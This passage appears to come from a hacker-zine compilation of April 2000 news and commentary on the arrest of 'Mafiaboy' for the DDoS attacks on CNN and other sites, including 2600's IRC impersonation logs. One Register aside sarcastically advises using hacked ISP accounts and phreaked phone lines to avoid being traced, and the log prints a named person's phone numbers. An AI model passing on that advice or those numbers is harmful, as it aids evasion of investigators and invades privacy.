      Although he was in biology class yesterday when police announced details 
      of his weekend arrest, he was reportedly not in school today, on the eve 
      of a five-day             Easter recess in Montreal-area schools. 

      Riverdale is an ethnically and economically mixed high school in a largely 
      English-speaking neighborhood, with about 1,200 students. More than half 
      its students go         on to community college or university. Students 
      are required to wear uniforms.

      Mafiaboy lives about a 12-minute drive from the school in a new 
      development of large brick and stone mini-mansions arrayed around the new 
      St. Raphael Golf Course. 

      Yesterday, a "for sale" sign was visible on the lawn of the family's 
      sea-foam-green brick house, as it has been for four months. The asking 
      price was recently              reduced below $250,000 (U.S.). There is a 
      paved basketball court on the side.

      A teenage boy who answered the door at the house late this afternoon 
      simply handed the visitor a lawyer's business card. Neighbors out in their 
      own yards told of a         family that kept largely to itself. Mafiaboy's 
      father is divorced, and the boy and his brother were       living with the 
      father and their stepmother.
      
      One neighbor said the father liked to sit out on the front stoop in his 
      sweat suit and make loud telephone calls on his cellular telephone using 
      noticeably crude           language.

      U.S. and Canadian authorities have been monitoring the home where Mafiaboy 
      lives for weeks but the authorities said they did not move to make arrests 
      in the case           until they were certain whose fingers were on the 
      keyboard.

      Mafiaboy could be sentenced to a term of up to two years in juvenile 
      detention for disrupting CNN's Web site, Canadian officials said 
      yesterday, although they added        that sentences for such crimes 
      typically are stiffer in the United States than in Canada.

      "Young hackers, talking mostly now about 14- to 15-year-olds up to 22- or 
      23-year-olds, sometimes do not realize the damages they could make with 
      their actions,"           said Yves Roussell, officer in charge of the 
      Montreal commercial crime section of the RCMP.

      Roussell said U.S. and Canadian politicians need to do a better job of 
      coordinating the legal penalties and sanctions for cross-border crimes, 
      including computer           hacking, and said additional resources are 
      needed to fight hacking. He said the RCMP is studying       the computers 
      and data taken from the home.

      "There are literally tons of documentation and information to analyze and 
      scrutinize and devise and from there we will pursue our criminal 
      investigation," Roussell         said. "We are still investigating the 
      case."

10.5 Mafiaboy:The Challenge of Fighting Cybercrime (Reno)
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


      http://www.cipherwar.com/news/00/reno_2.htm

      The Challenge of Fighting Cybercrime ....04.20.00 

      If you haven't heard, the Canadian police have arrested a 15 year-old boy 
      in connection with the February DDoS attacks.       Canadian law protects 
      the suspect's privacy by prohibiting the release of Mafiaboy's true 
      identity. This fact alone is a refreshing change from the American way of 
      donig things. Arrest someone on the most pathetic evidence you can obtain, 
      like chat room logs, and release their identity, ruin their lives, and 
      then release them because there is not enough evidence. 

      Janet Reno, among other inadequate criminal investigators, claims that the 
      arrest proves that they can track down       cybercriminals. Reno forgets 
      that an individual is innocent until proven guilty, therefore they have 
      not proven they can track down cybercriminals. And how long has it taken 
      them to even find a 15 year-old boy to pin it on? Mafiaboy was arrested in 
      Canada, and this is probably a good thing for him since the US Justice 
      Department would probably have hung him out to dry as the big bad hacker, 
      that he is probably not. 

      Just to show how ridiculous Janet Reno is, below is an exerpt, uncut, of 
      an address by Reno in February shortly after the       DDoS attacks.

      The entire "statement" can be found here: 
      http://www.cybercrime.gov/ag0216.htm.


     The Challenge of Fighting Cybercrime 

     The recent attacks highlight some of the challenges we face in 
     combating cybercrime.  The challenges come in many forms: technical 
     problems in tracing criminals operating online; resource issues 
     facing federal, state, and local law enforcement in being able to 
     undertake online criminal investigations and obtain evidence stored 
     in computers; and legal deficiencies caused by changes in 
     technology.  I will discuss each of these briefly. 

     As a technical matter, the attacks like the ones we saw last week 
     are easy to carry out and hard to solve.  The tools available to 
     launch such attacks are widely available.  In addition, too many 
     companies pay inadequate attention to security issues, and are 
     therefore vulnerable to be infiltrated and used as launching pads 
     for this kind of destructive programs.  Once the attacks are 
     carried out, it is hard to trace the criminal activity to its 
     source.  Criminals can use a variety of methods to hide their 
     tracks, allowing them to operate anonymously or through masked 
     identities.  This makes it difficult  and sometimes impossible  
     to hold the perpetrator criminally accountable. 

     Even if criminals do not hide identities online, we still might be 
     unable to find them.  The design of the Internet and practices 
     relating to retention of information means that it is often 
     difficult to obtain traffic data critical to an investigation.  
     Without information showing which computer was logged onto a 
     network at a particular point in time, the opportunity to determine 
     who was responsible may be lost. 

     There are other technical challenges, as well, that we must 
     consider.  The Internet is a global medium that does not recognize 
     physical and jurisdictional boundaries.  A hacker  armed with no 
     more than a computer and modem  can access computers anywhere 
     around the globe.  They need no passports and pass no checkpoints 
     as they commit their crimes.  While we are working with our 
     counterparts in other countries to develop an international 
     response, we must recognize that not all countries are as concerned 
     about computer threats as we are.  Indeed, some countries have weak 
     laws, or no laws, against computer crimes, creating a major 
     obstacle to solving and to prosecuting computer crimes.   I am 
     quite concerned that one or more nations will become "safe havens" 
     for cybercriminals. 

     Resource issues are also critical.  We must ensure that law 
     enforcement has an adequate number of prosecutors and agents  
     assigned to the FBI, to the Department of Justice, to other federal 
     agencies, and to state and local law enforcement  trained in the 
     necessary skills and properly equipped to effectively fight 
     cybercrime, whether it is hacking, fraud, child porn, or other 
     forms. 

     Finally, legal issues are critical.  We are finding that both our 
     substantive laws and procedural tools are not always adequate to 
     keep pace with the rapid changes in technology.  

     Are We Supposed To Feel Symapthy For Her?

10.6 Mafiaboy:Janet Reno licks chops over Mafiaboy arrest
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
      

      Posted 20/04/2000 5:11pm by Thomas C. Greene in Washington

      Janet Reno licks chops over Mafiaboy arrest

      US Attorney General Janet Reno glowed with pleasure during a Wednesday 
      press conference as she wagged her finger and called for the Canadian 
      courts to punish Mafiaboy for causing DDoS mayhem on the Web back in 
      February. 

      "I think that it's important first of all that we look at what we've seen 
      and let young people know that they are not going to be able to get away 
      with something like this scot-free," Reno told reporters, as if Mafiaboy 
      had already been tried and convicted. "There has got to be a remedy, there 
      has got to be a penalty." 

      Reno did stop just shy of telling the Canadian courts precisely what the 
      penalty ought to be. But if Mafiaboy should be convicted, his punishment 
      will undoubtedly be a good deal lighter than anything a malicious hacker 
      might get in the USA, which, it was revealed today, has achieved the 
      distinction of maintining the world's largest polulation of citizens 
      locked up in cages. 

      Reno also took the opportunity to boast about the profound technical savvy 
      of her troops in the field. 

      "I believe this recent breakthrough demonstrates our capacity to track 
      down those who would abuse this remarkable new technology, and track them 
      down wherever they may be," Reno said. 

      Yeah, right. The Register recalls the very brief period of DoJ 
      tirumphalism over Coolio's arrest and how quickly it evaporated, and 
      thinks that this 'recent breakthrough' demonstrates nothing so much as the 
      Feds' desperate need to pounce on any scapegoat they can find in hopes of 
      concealing how hopeless they are in tracking cyber-criminals. 

      The hacking underground remains wisely reluctant to believe that Mafiaboy 
      is more than a scapegoat, at least until evidence is produced. The scene 
      has been abuzz with sceptics, while the mainstream press, predictably, 
      appears satisfied that the Mounties have got their boy. 

      Meanwhile, 2600.com has posted a bogus IRC log between a staffer posing as 
      Mafiaboy and one 'Icee' who the magazine claims is the person responsible 
      for tipping the Feds to Mafiaboy's alleged DDoS attacks. 

      We're not entirely sure what the point of this stunt is, except perhaps to 
      demonstrate that anyone can pretend to be anyone else in IRC in hopes of 
      casting doubt on the authenticity of the Mafiaboy logs which are expected 
      to be produced in evidence against him at trial. 

      Nice try, but of course the Feds can obtain both IRC and ISP logs, so it's 
      not terribly hard for them to divine the true origins of IRC traffic. You 
      can go on line as 'Icee' and fool, say, the editors of 2600; but if the 
      Feds can persuade a judge to issue a trap and trace order, they will get 
      all the evidence needed to pin the logs on the dummy....and probably 
      figure out how to piece it together, or at least hire someone with a brain 
      to do it for them. 

      (Note to wannabe leet h4x0rz: IRC traffic is logged, Einstein, so always 
      connect through a hacked ISP account or a freebie such as NetZero where 
      you can register with fictional information; and always dial in from a 
      phreaked telephone account [preferably in Tonga or Madagascar]. If you 
      can't manage that much, then don't say anything in IRC that you wouldn't 
      announce over a bull horn in the lobby of FBI Headquarters.) 

      Speaking in conclusion, again as if Mafiaboy had been tried and convicted, 
      Reno lectured the populace on morality. "We have got to renew our efforts 
      to teach young people -- children -- cyber-ethics," she said. 

      Renew them? We were blissfully unaware that any such efforts had been 
      made in the first place. ®

10.7 Mafiaboy:IS MAFIABOY REAL OR A CREATION OF THE MEDIA? 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~      

     IS MAFIABOY REAL OR A CREATION OF THE MEDIA? 04/20/00 

     We'd like to officially express our skepticism on the recent arrest of a
     Montreal teenager for the Denial of Service attacks back in February. 
     Naturally, we always have reason to be somewhat doubtful whenever the 
     authorities claim to know the first thing about the Internet. But in this
     case, we wanted to see just how clueless they could possibly be. When the
     name "mafiaboy" was first mentioned months ago, a couple of us hopped onto
     IRC using that nick. Sure enough, within seconds, we were being messaged 
     by people who believed we were the person responsible. Amazingly, the 
     person who fell for it the hardest is the very person now being quoted
     widely in the media as having caught the perpetrator. Now perhaps this is
     all just a big coincidence. But as you can see from the IRC logs below, we
     dropped a few clues that the person was in a country with snow and at one 
     point "accidentally" spoke French to imply the province of Quebec. We were
     amazed when the blame actually landed on someone from Montreal. 

     A good question to ask is why we would want to cause such confusion and
     mayhem. The answer is to prove a point. That all one needs to do to be 
     considered a suspect is change a nickname on IRC. We had absolutely NO 
     proof that we could provide to make this fictitious person responsible 
     in any way for the attacks. Yet we were believed by countless people, 
     including the "expert" who is taking credit for the arrest. And now we
     see that the main piece of evidence against the real person who was 
     arrested is the fact that he was "bragging" in an IRC channel. Please. 
     If this is indeed the person responsible (and what a geographical 
     coincidence THAT would be), we'd like to see them held accountable to a
     REASONABLE degree. But in order to do this fairly, the evidence must be
     made public. Otherwise, we will continue to believe that the authorities
     and the media are more interested in sending a message than actually 
     achieving justice.

      [mafiaboy] if they are looking for this person, they sure as hell would be 
      *icee* now that is ALL I CAN SAY until i hear more from you 
      *icee* my docs are this: Michael Lyle, 408-238-3090 
      *icee* go to a payphone for all the fuck i care 
      *icee* that way, if you really want, you can take the communications out of
             band. 
      *icee* But before i can talk to you, i need that piece of information.       
      [mafiaboy] one question 
      *icee* sure. 
      [mafiaboy] if you have this info. who have you told? 
      *icee* I can't tell you that, until you tell me the other piece 
      *icee* but i told no one anything that wasn't already out there. 
      [mafiaboy] well no one was fucking msging me an hour ago 
      *icee* look, i'm neither your friend nor your enemy.. i'm an interested
             party 
      [mafiaboy] brb 
      *icee* I'm much closer to a friend than your enemy, though. 
      [mafiaboy] ok 
      [mafiaboy] since we need to build some trust here 
      [mafiaboy] let's cover some things that don't involve disclosing anything 
                 non-public 
      *icee* okay. 
      [mafiaboy] i need to know why people just started msging me. 
      *icee* because information about you was disclosed about you on a news 
             broadcaast by my company. 
      [mafiaboy] you work for a news agency? 
      *icee* i can't tell you where that information was obtained until I build 
             some trust with you 
      *icee* no, i work for a computer security firm. 
      *icee* Please don't wig out at that 
      [mafiaboy] so is that your interest in this? 
      *icee* Not really. 
      *icee* Pieces of it. 
      *icee* If i can benefit myself without hurting you, i'll take advantage 
             of it.
      *icee* But um, i've been in a situation similar to yours before 
      [mafiaboy] so then, why did you go to the media if no one knew yet? 
      *icee* i can't really talk about that until we build more trust 
      *icee* because everyone already knew-- just no one had broken the story 
             hurt you 
      [mafiaboy] whois everyone? 
      *icee* fuck. 
      *icee* look, i need to know more from you 
      *icee* before i can go into this. 
      [mafiaboy] well wtf 
      *icee* and i need to be on a secure mode of communication 
      [mafiaboy] "everyone" USUALLY includes the media! 
      *icee* i need to be assured you're not calling into a dirty provider 
      *icee* or you need to call me or something 
      *icee* and you need to provide me with that secret 
      *icee* so i know i'm talking to you 
      *icee* here's why: 
      *icee* i'm not doing anything illegal 
      *icee* but the information that i would give you 
      *icee* has no value 
      *icee* if other people get it. 
      *icee* if not, it stops here: I suggest you talk to a lawyer, and I wish
             you honestly the best of luck. 
      [mafiaboy] so let me get this straight 
      [mafiaboy] 3 days, this is one of the top international news stories.
                 everyone wants to know who is responsible. the fbi and the
                 president make speeches saying they are clueless. You say 
                 "everyone knows" and you fucking tell the media???? 
      [mafiaboy] i mean 
      *icee* look 
      [mafiaboy] i'mjust trying to make sure i have the full picture 
      *icee* will you take a valium or something, maybe have a swig of
             alcohol or three.. 
      [mafiaboy] not that it's me or anything 
      *icee* and just realize the truth here: I'm trying to be your friend. 
      *icee* doesn't put you in any more danger 
      *icee* if i was a fed, and i didn't know who you are 
      [mafiaboy] i think perhaps you should take a step back and think about
                 this from my end 
      *icee* by now, someone would have installed logging access lists and 
             figured out your ultimate source address 
      *icee* and coordinated the data from calling records 
      *icee* and know exactly where you are right now. 
      *icee* Keeping you in the conversation this long would have been enough 
      *icee* but that was not my objective. 
      *icee* nor am i working with the FBI 
      [mafiaboy] i nver said you were 
      *icee* so please realize you're giving me nothing more, and get a secure
             line of communication with me, and talk to me 
      [mafiaboy] i know you're not a fed. you're with Recourse Technologies in
                 sunny palo alto 
      *icee* I understand it has to be scary as fuck, and i understand i'm not
             being easy to work with 
      *icee* oh, did you listen to our radio stuff up there in Canada, too? 
      [mafiaboy] you were on the radio too??? 
      *icee* i think they're the only people i talked to who called it sunny 
             palo alto 
      *icee* I am not out to get you. 
      [mafiaboy] who are you fucking Shimomura? 
      *icee* yes. 
      *icee* no 
      *icee* I am not out to get you. 
      [mafiaboy] we don't even know eachotehr and you're already looking for
                 your markoff 
      *** icee has changed the topic on channel #recourse to: *mafiaboy* who
          are you fucking Shimomura? 
      *icee* No I'm not. 
      *icee* I'm not trying to go down as the person who nailed you 
      *icee* people already did that 
      *icee* And i could tell you more about it 
      *icee* if you'd just fucking talk to me 
      *icee* but listen to why i can't: 
      *icee* if you are not the mafiaboy i think 
      *icee* and i reveal the information 
      *icee* i've destroyed its utility 
      *icee* and then i wouldn't have done you much of a favor now, would 
             i have? 
      [mafiaboy] if i'm already nailed, how come no raid? 
      *icee* do you know what flow stats are? logging access lists? 
      *icee* i can tell you quite clearly how you were nailed 
      *icee* and i can tell you why there's no raid 
      *icee* but i NEED INFORMATION 
      *icee* and the thing is 
      *icee* I'm willing to help you for two reasons: 
      [mafiaboy] it's going to be a while before i can get to another means of 
                 communication 
      *icee* I was in a situation once similar to yours, sort of 
      *icee* and I'm hoping that if i help you a bit, maybe you'll help me a 
             little too 
      *icee* well, are you on sympatico now? 
      [mafiaboy] no 
      [mafiaboy] one question though, is it politics? 
      *icee* Okay, then can we take it to DCC? I consider that safe. 
      *icee* why you're not? 
      *icee* yes. 
      *icee* that'll buy you a couple of days at most. 
      [mafiaboy] they're capitalizing off it 
      [mafiaboy] ? 
      *icee* that and the fact the FBI got a little confused 
      *icee* it's the fact that it crosses national borders, and there's 
             difficult procedural problems to solve. 
      *icee* none of the evidence is in .ca 
      *icee* or very little of it.

      [mafiaboy] no, just started 
      *icee* Look, here's the deal. ssh to some account somewhere that they didn't
             know about, or something, so we have a secure channel, so we can talk. 
      [mafiaboy] why 
      [mafiaboy] they dont know about this one, not yet anyway 
      *icee* okay, then let's take it out of band, in DCC. 
      *** DCC CHAT (chat) request received from icee 
      *** DCC CHAT connection with icee[206.79.254.229] established 
      =icee= okay. we talked last night, right? 
      [mafiaboy] yep 
      =icee= (i'm asking because with the circumstance, there's fair odds someone
              might message me and pretend to be you) 
      =icee= okay, we need to solve this trust problem, and prove you are who you
             say you are.. so the name of the channel.. it starts with a m. can 
             you tell me it? 
      =icee= #bifemunix is a rival. 
      [mafiaboy] 3090 
      [mafiaboy] good enough? 
      =icee= okay, that's good enough, but i don't know if that was the 
             brightest thing to say when we could be possibly listened to 
      =icee= Okay: 
      =icee= here's the deal: 
      =icee= the authorities have a large amount of information which has
             been salvaged from machines taken into evidence, as well as: 
      =icee= flow statistics on routers 
      =icee= routers keep information on all layer 4 connections for the 
             purpose of ensuring quality of service 
      =icee= because the information is kept in the router for a length of
             time, it serves as a pretty accurate way to see what host has
             talked to what other host recently 
      =icee= sprint, mci, abovenet, and exds all worked together and put
             the flow information together 
      =icee= they were also able to correlate information from a number 
             of different sources, like logging access lists on routers 
      =icee= From teh RUMORS i'm hearing, the only thing keeping you out of
             jail at the moment is geopolitical issues, and the fact that 
             they don't think you're behind all of the attacks 
      =icee= I think the general idea is, they're going to swoop in, get 
             you in custody, and then when you can't talk to anyone else 
             or do anything else, completely fuck you over 
      =icee= So I have a couple of different recommendations, depending
             on what road you want to take 
      =icee= 1) get a lawyer, surrender to custody, try to plea bargain 
      =icee= or 2) publically make a statement 
      =icee= because if you don't do something now, your ability to talk
             to the rest of the world is going to be limited 
      =icee= if it looks like you didn't know what the fuck you were 
             doing, things can turn out a lot better 
      =icee= and I have some information, that i certainly can't say over
             the phone, that could be of great value to your defense 
             attorneys 
      [mafiaboy] and whats in it for you 
      =icee= What is in it for me? 
      =icee= You pick option #1, nothing 
      =icee= You pick option #2, I'd like to be the person who leads you forward. 
      =icee= But that's also up to you 
      [mafiaboy] and then you write a book 
      =icee= I don't want to write a book 
      =icee= i want to sell software 
      [mafiaboy] i have sme software here 
      =icee= what's that mean? 
      =icee= recourse technologies is a softawre company 
      [mafiaboy] haha 
      =icee= The other thing is: i might be able to be a witness in your favor 
      =icee= and I could certainly help in substantiating you didn't launch all
             of the attacks 
      =icee= I only know for certain you nailed CNN. 
      [mafiaboy] but you dont really 
      =icee= okay, here's the things i know 
      =icee= i know a sympatico ip, and a time; i know everyone says you did 
             it; and i know you use sympatico.ca 
      =icee= or used. 
      =icee= the second set of facts help me more than the FBI; but the first
             is enough for them to nail you.. see? 
      =icee= btw, don't call me now, i'm not at home. 
      =icee= of course, you could call me at work, 650-565-8601 ext 107 
      =icee= let me tell you my personal opinions: i think denial of service
             is lame as fuck 
      =icee= and i don't think what you did was particularly cool 
      =icee= i think you probably didn't realize the implications though, either 
      [mafiaboy] i gotta smoke and walk around a while 
      =icee= *nods* 
      =icee= Just look: 
      =icee= if you think carefully, and don't freak out 
      =icee= you can get community service, and end up picking up trash or something 
      =icee= for 300 hours.. not fun, but better than spending time in juvvie 
      [mafiaboy] oui 
      [mafiaboy] ack 
      [mafiaboy] misfire 
      =icee= re 
      =icee= so, any clue what you're going to do? 
      [mafiaboy] no, i was just talking to a friend on the payphone 
      =icee= bleh, not talking to me anymore? 
      [mafiaboy] i dont think i'm in any danger here 
      =icee= um, why not? 
      [mafiaboy] many reasons 
      =icee= Look: 
      =icee= i don't know if you've heard of me or not 
      =icee= but at one time i was considered the very, very best 
      =icee= and i don't possibly understand how you could consider your position 
             safe. 
      [mafiaboy] why arent you best any more 
      =icee= you have lots of people who are willing to rat on you who saw 
             you demonstrating your might, there's definite information which
             ties you to a dialup address.. and i don't see what diversion you
             could have done through the phone system to adequetely protect 
             yourself 
      =icee= I'm best in something different, now. 
      =icee= I do mathematics and analyze networks. 
      =icee= I broke in to things to find out about computers and learn 
      =icee= once i got legitimate access to them, there wasn't a lot of
             reason to do it anymore 
      =icee= and besides: computer security is a much tougher problem than
             breaking something to take it down or break in 
      [mafiaboy] you still know ppl in the scene?? 
      =icee= I know a lot of people 
      =icee= but to be honest: 
      =icee= the scene is very lame 
      =icee= 99.9999% today have never written exploit code 
      =icee= i come from a different time, and a different ethic 
      =icee= what we were doing used to stand for something 
      =icee= now it's just not the same anymore. 
      [mafiaboy] dont know much bout thepast 
      =icee= well, i'd like to tell you about it, sometime. 
      =icee= see, i'm sure you've read some shit by the mentor, right? 
      [mafiaboy] but you sound like a friend of mine 
      =icee= i knew the mentor, even hear from him time to time 
      =icee= his name came from the fact that he took an active part in taking
             people new to the scene, who showed promise, and showed them how 
             to move forward and what to learn 
      =icee= i kinda have had that role in the past 
      =icee= a lot of people who you probably know now have learnt from me 
      =icee= Basically, I've never wanted attention or anything 
      =icee= the only reason i'm on TV now, is the fact that I have 20 people
             whose livelihoods depend on the fact they've trusted me 
      =icee= and what is good for my company is good for them 
      =icee= to be honest i was terrified to death of it and wanted to go
             home after the second radio interview 
      =icee= here's the deal though: 
      =icee= i'm your friend, and i'm available to provide you with information 
      =icee= but, these are the conditions: 
      =icee= I am not going to do anything that incriminates myself 
      =icee= and if i get subpoenaed i will cooperate, so you want to limit that
             which you say to me 
      =icee= and if there's something you can do in the future that benefits
             me, without hurting you, i'd like you to please consider it. 
      =icee= if you want to come forward, and get your situation known to 
             the public... 
      =icee= then i would like to facilitate that. 
      =icee= but it's jsut if you choose that road. 
      [mafiaboy] see 
      [mafiaboy] i dont know you 
      =icee= *nods* 
      =icee= and there's one last thing: 
      =icee= i have a piece of information which is extremely valuable in 
             your defense 
      =icee= regarding the handling of the case, and a crucial mistake 
             which was made 
      =icee= Look, you've gained favor among a little crowd, but be honest
             with me, you know that almost anyone could install the tools 
             that you did
      =icee= I could show any 12 year old who could read how to in an hour 
      =icee= run exploit, compile, install program, put in startup scripts
          .. rinse, repeat, whatever 
      [mafiaboy] yes but nobody did it 
      =icee= but WHY do it? 
      [mafiaboy] snowday 
      [mafiaboy] haha 
      =icee= right now they're blaming a 500 point drop in the Dow on you; 
             saying you had tens of millions of dollars of economic impact 
      =icee= you think they're not going to put the pieces together? 
      =icee= there's an infinite set of different kinds of information
             which can be used to nail you; forensic data on the 
             machines you compromised (deleted files; residues in
             kernel memory if the machine was taken down), there's
             residues of the information in the routers; in SNMP 
             audit logs in hp openview 
      [mafiaboy] maybe people will invest in something else and the dow
                 will go back up? 
      =icee= RADIUS logs 
      [mafiaboy] but nobody will give credit for that 
      =icee= Hey, you and I both know nothing has changed; the Dow
             ounced backed today, people will re-invest in ecommerece,
             it won't really change anythying 
      =icee= but the fact is: Janet Reno has put her career on teh
             line saying they'll catch you 
      =icee= and the entire FBI reports to her 
      =icee= and like, i don't know if you did etrade or datek, but
             if you did either of those, you're likely to be 
             particularly fucked. 
      [mafiaboy] no comments 
      [mafiaboy] ;] 
      =icee= well, obviously: i don't want to know. 
      =icee= But i can tell you this: you're definitely fucked on CNN. 
      [mafiaboy] you mean aol? 
      =icee= well, BBN 
      =icee= did you just mean to take down AOL, and nailed CNN, too? 
      [mafiaboy] see above no comments 
      =icee= heh 
      =icee= that's a bummer

10.8 Mafiaboy:Canadian Feds charge Mafiaboy in DDoS attacks
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~      
           
     Posted 19/04/2000 6:05pm by Thomas C. Greene in Washington
     
     Canadian Feds charge Mafiaboy in DDoS attacks
     
     Canadian authorities have charged a fifteen-year-old boy with
     two counts of "mischief to data" for taking part in the distributed
     denial of service (DDoS) attacks which shut down popular Web sites 
     such as Yahoo!, eBay, CNN and Amazon in February, and which finally
     brought a healthy scepticism of Internet security into the mainstream
     consciousness. 
     
     Royal Canadian Mounted Police Inspector Yves Roussel said they were
     tipped off when the lad boasted in Internet chat rooms about what he
     had done. Police obtained a warrant and searched his Montreal home, 
     seizing computers and software and placing the lad under arrest on 15
     April, he said. 
     
     Mafiaboy appeared before a Montreal Youth Court judge on Monday and
     was released, but with strict conditions. 
     
     "Considering the seriousness of the charges, and consequences derived
     from the alleged actions, and in order to prevent further attacks, bail
     conditions were imposed. Hence, Mafiaboy is prohibited from the use of 
     a computer except at school for academic reasons; and he must be under 
     the direct and constant supervision of a teacher or another [adult] 
     supervisor," Roussel said during a Wednesday press conference. 
     
     "They liked to show off that they were good at it, and that, you know,
     they are the best; but it is our evaluation that Mafia boy is not that
     good, actually. He had a good knowledge of computers; however, he 
     wasn't what we could call a genius," Roussel added. 
     
     The on-going investigation is a joint operation of the RCMP's Computer
     Investigation Unit, the FBI and US Department of Justice. More arrests
     could be made, Roussel indicated, but offered no further details. 
     
     "Wherever they are, [malicious] hackers will be investigated and 
     arrested," he warned. ®

     Anatomy of the Attacks 
     
      
     By David A. Vise and Ariana Eunjung Cha
     Washington Post Staff Writers
     Thursday, April 20, 2000; Page A01 
     
     A 15-year-old Canadian computer whiz known online as "Mafiaboy" 
     yesterday became the first person to be charged with carrying out one 
     of the cyber-attacks in February that disabled a string of the Web's 
     most high-profile sites. 

     
     Law enforcement officials said the youth, a Montreal resident, was 
     arrested on the basis of evidence linking him to the attack on 
     CNN.com, which involved flooding the site with so many requests for 
     information that legitimate users were effectively locked out. The 
     officials said they are still investigating his potential involvement 
     in other strikes.

     
     U.S. and Canadian agents working on the case declined to comment on 
     the probability of other arrests, but computer experts who have 
     worked closely with them say Mafiaboy is likely a copycat because the 
     assault program he used was so different from the ones used to 
     cripple Yahoo, the first site to go down, and several others.

     
     The Royal Canadian Mounted Police (RCMP) arrested the youth at his 
     home on Saturday, seizing all his computers. He was charged with two 
     counts of "mischief" against the CNN site before being released to 
     the custody of his parents, pending trial in Montreal youth court. 
     Because of the suspect's age, his name and address cannot be released 
     under Canadian law.

     
     The attacks, which took place Feb. 7 through 14 and also affected 
     Buy.com, eBay, Amazon.com and E-Trade, shut users from around the 
     world out of the news and trading systems they are beginning to 
     depend on, cost corporations millions of dollars, and showcased the 
     vulnerabilities of the Internet. The events caused many to question 
     the security of the vast World Wide Web, although no personal 
     financial information was compromised.

     
     Mafiaboy could receive a maximum of two years in a juvenile detention 
     facility and have to pay a fine of about $680, RCMP Inspector Yves 
     Roussel said. But Roussel said it would be unusual for the youth to 
     get jail time: "Even with adults, it's rarely done that a court will 
     impose imprisonment for this crime."

     
     As a condition of his release, Canadian police and U.S. Justice 
     Department officials said the young man is prohibited from using the 
     Internet, visiting stores or businesses that have computers, using 
     computers in an unsupervised setting, and associating with three 
     close friends. He is permitted to use a computer at school for 
     academic work, provided teachers watch his every move. He also has a 
     curfew, requiring him to be at home from 8 p.m. until 7 a.m. every 
     day.

     
     Investigators are looking into the possibility that other hackers may 
     have been working with Mafiaboy. Roussel said that investigators 
     still had "tons" of evidence seized at Mafiaboy's house to evaluate 
     and that others may be charged later. Joel De La Garza, a consultant 
     with Palo Alto, Calif.-based security firm Securify Inc. who has been 
     tracking Mafiaboy for about a year, said that before the attacks on 
     CNN, Mafiaboy openly asked for and received technical assistance from 
     several other people in an online chat room so that he could break 
     into computers he hoped to use as launch pads for his attacks.

     
     Mafiaboy was part of a group of youths who spent hours on a 
     password-protected chat channel called TNT on the Internet's original 
     discussion network, EFNet, which is part of Internet Relay Chat 
     (IRC). His group was a bunch of "script kiddies," a derisive term 
     used for people who use cookie-cutter hacker attack tools readily 
     available on the Web and don't have the skills to create their own, 
     De La Garza said.

     
     Indeed, Mafiaboy and some of his friends were known to regularly take 
     down some of the EFNet servers using the same type of strategy that 
     was employed against Yahoo and the other popular sites.

     
     "It doesn't take someone with a computer science degree or a vast 
     amount of technical sophistication," said Mike Vatis, head of the 
     FBI's National Infrastructure Protection Center, "but it does take a 
     concerted effort and detailed plan to break in these sites and plant 
     your code and deploy it."

     
     The name Mafiaboy arose early in the FBI's investigation. Most of the 
     early evidence linking the alias to the attacks was based on logs of 
     online chats provided by private security experts at Securify, 
     Recourse Technologies Inc. and others. But connecting Mafiaboy to a 
     person and address was confusing because many people use that 
     moniker.

     
     Vatis said the FBI's Atlanta and Los Angeles offices helped determine 
     by Feb. 12, or about five days after the computer attacks began, that 
     some of the strikes were coming from a telephone line in Montreal. 
     Two days later the FBI contacted the Canadian police. It took the 
     RCMP one day to identify where Mafiaboy lives, but it then took weeks 
     to determine who in the house was responsible for the attacks.

     
     Early on, federal officials, private individuals and curious computer 
     wonks began trolling the IRC networks, popular haunts for hackers, 
     hoping that the culprits would brag about their achievements. Dozens 
     of hackers and hacker wanna-bes did claim credit for the attacks.

     
     But Michael Lyle of security firm Recourse in Palo Alto said one 
     person, Mafiaboy, stood out. Lyle said he and other people from his 
     company engaged Mafiaboy in several online conversations. Mafiaboy 
     claimed to have attacked CNN.com and E-Trade, among other sites. 
     Those two sites went down within five to 10 minutes after Mafiaboy 
     announced that he would cripple them, Lyle said.

     
     Lyle described Mafiaboy as naive: "I don't think he understood the 
     scope of his actions or the effects on other people. I think it was 
     him saying, 'Boy, wouldn't it be cool to take down sites?' "

     
     The discovery of an attack program planted on a research computer at 
     the University of California at Santa Barbara the week after the 
     assaults began turned out to be a pivotal break in the case, 
     according to people familiar with the investigation.

     
     In a typical "distributed denial of service" strike, such as the one 
     that disabled CNN.com, attackers first break into multiple computer 
     systems and plant malicious programs they activate remotely. The 
     "zombie" machines act in concert, flooding a target site with 
     requests for information, shutting out real users.

     
     The UC-Santa Barbara computer is among the dozens to hundreds thought 
     to have been used in the recent attacks.

     
     Kevin Schmidt, a network programmer on the campus, found some extra 
     data packets leaving the school's computer system and traced them 
     back to a hacked machine that was attacking CNN.com. He said the work 
     was "sloppy" and left an obvious trail, which he was able to trace 
     back to a handful of computers in the United States and Canada.

     
     FBI Director Louis J. Freeh called the arrest of Mafiaboy a milestone 
     in global law enforcement efforts to battle cyber-crime. "This and 
     other recent cyber-crime successes demonstrate the strengths to be 
     drawn from an international law enforcement-private sector 
     partnership," he said. Among the agencies involved in the 
     investigation was the National Aeronautics and Space Administration, 
     which has often has been the target of hacker attacks.

     
     But some facts indicate at least one other party likely was involved 
     in the February attacks.

     
     The software programs launched against Yahoo and eBay--the first 
     high-profile sites to be hit--were radically different from those 
     that hit CNN and E-Trade later in the week, according to security 
     experts.

     
     The first were significantly more powerful than the latter programs, 
     according to people who have analyzed them, and who believe it makes 
     little sense for the attacker to have switched to an inferior strike 
     method.

     
     "That's like saying I'm going to get into a fight and I'm going to 
     trade my Uzi in for a stick," said Securify's De La Garza, who along 
     with Stanford University computer administrator David Brumley has 
     been assisting the FBI.

     Canada Arrests 'Mafiaboy' Hacker, Aged 15 
     Reuters Apr 19 2000 7:49PM ET 
                                                                                                                      


      MONTREAL (Reuters) - A 15-year-old hacker, known online as
      ''Mafiaboy'', was charged by Canadian police on Wednesday with
      mischief in one of the biggest cyber attacks in history.

      The charges relate to the jamming of the CNN.com (TWX.N) Web
      site and up to 1,200 CNN-hosted sites for four hours on February 8.

